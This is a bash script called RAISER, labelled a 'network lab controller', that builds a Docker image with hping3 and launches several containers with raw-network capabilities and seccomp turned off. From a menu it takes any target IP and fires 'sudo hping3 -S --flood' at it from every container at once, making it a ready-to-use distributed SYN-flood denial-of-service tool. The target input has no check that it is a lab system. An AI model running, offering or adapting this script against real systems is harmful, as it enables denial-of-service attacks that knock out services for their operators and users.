#!/bin/bash

#=


CYAN="\033[1;36m"
GREEN="\033[1;32m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"


CONTAINER_COUNT=0
TARGET_IP=""
COMMAND=""



#


COMMAND_TEMPLATE="sudo hping3 -S --flood TARGET_IP"



clear


echo -e "${CYAN}"

cat << "EOF"


██████╗  █████╗ ██╗███████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔══██╗
██████╔╝███████║██║███████╗█████╗  ██████╔╝
██╔══██╗██╔══██║██║╚════██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║███████║███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝


              R A I S E R

        NETWORK LAB CONTROLLER


EOF

echo -e "${RESET}"



# =========================================================
# BUILD IMAGE
# =========================================================


build_image()
{

if docker images | grep -q raiser-image
then

echo -e "${GREEN}[OK] RAISER image already exists${RESET}"

return

fi


echo -e "${YELLOW}[+] Building RAISER image...${RESET}"


mkdir -p raiser_build


cat > raiser_build/Dockerfile <<EOF

FROM ubuntu

RUN apt update && \
    apt install -y sudo hping3 iputils-ping nano

CMD ["bash"]

EOF


docker build -t raiser-image raiser_build


echo -e "${GREEN}[OK] Image created${RESET}"

}



# =========================================================
# CREATE CONTAINERS
# =========================================================


create_containers()
{

read -p "Number of RAISER containers: " CONTAINER_COUNT


build_image


for i in $(seq 1 $CONTAINER_COUNT)
do


NAME="raiser_node_$i"


docker rm -f $NAME >/dev/null 2>&1


docker run -dit \
--name $NAME \
--cap-add=NET_RAW \
--cap-add=NET_ADMIN \
--security-opt seccomp=unconfined \
raiser-image bash


echo -e "${GREEN}[+] $NAME created${RESET}"


done

}



# =========================================================
# CHOOSE IP
# =========================================================


choose_ip()
{

read -p "Enter target IP address: " TARGET_IP


COMMAND="${COMMAND_TEMPLATE/TARGET_IP/$TARGET_IP}"


echo
echo -e "${CYAN}Command prepared:${RESET}"
echo "$COMMAND"

}



# =========================================================
# EXECUTE COMMAND
# =========================================================


execute_command()
{


if [ -z "$COMMAND" ]

then

echo -e "${RED}No command prepared. Choose an IP first.${RESET}"

return

fi



echo -e "${YELLOW}[+] Executing command:${RESET}"
echo "$COMMAND"



for i in $(seq 1 $CONTAINER_COUNT)
do


NAME="raiser_node_$i"


docker exec -u root -d $NAME bash -c "$COMMAND"


echo -e "${GREEN}$NAME started${RESET}"


done


}



# =========================================================
# LIST CONTAINERS
# =========================================================


list_containers()
{

docker ps --filter name=raiser_node_

}



# =========================================================
# ENTER CONTAINER
# =========================================================


enter_container()
{

read -p "Container number: " NUMBER


docker exec -it raiser_node_$NUMBER bash

}



# =========================================================
# STOP CONTAINERS
# =========================================================


stop_containers()
{

for i in $(seq 1 $CONTAINER_COUNT)
do


docker stop raiser_node_$i >/dev/null 2>&1


echo -e "${YELLOW}raiser_node_$i stopped${RESET}"


done

}



# =========================================================
# DELETE CONTAINERS
# =========================================================


delete_containers()
{

read -p "Delete all RAISER containers? (yes/no): " ANSWER


if [ "$ANSWER" = "yes" ]

then


for i in $(seq 1 $CONTAINER_COUNT)
do


docker rm -f raiser_node_$i >/dev/null 2>&1


echo -e "${RED}raiser_node_$i deleted${RESET}"


done


CONTAINER_COUNT=0


else

echo "Cancelled"

fi

}



# =========================================================
# MENU
# =========================================================


while true
do


echo -e "${CYAN}"

echo "================================="
echo "           RAISER MENU"
echo "================================="

echo "01 - Create containers"
echo "02 - Choose target IP"
echo "03 - Execute command"
echo "04 - List containers"
echo "05 - Enter a container"
echo "06 - Stop containers"
echo "07 - Delete containers"
echo "08 - Exit"

echo "================================="

echo -e "${RESET}"


read -p "RAISER > " OPTION



case $OPTION in


01)
create_containers
;;


02)
choose_ip
;;


03)
execute_command
;;


04)
list_containers
;;


05)
enter_container
;;


06)
stop_containers
;;


07)
delete_containers
;;


08)
echo "Closing RAISER..."
exit
;;


*)

echo "Invalid option"

;;

esac


done
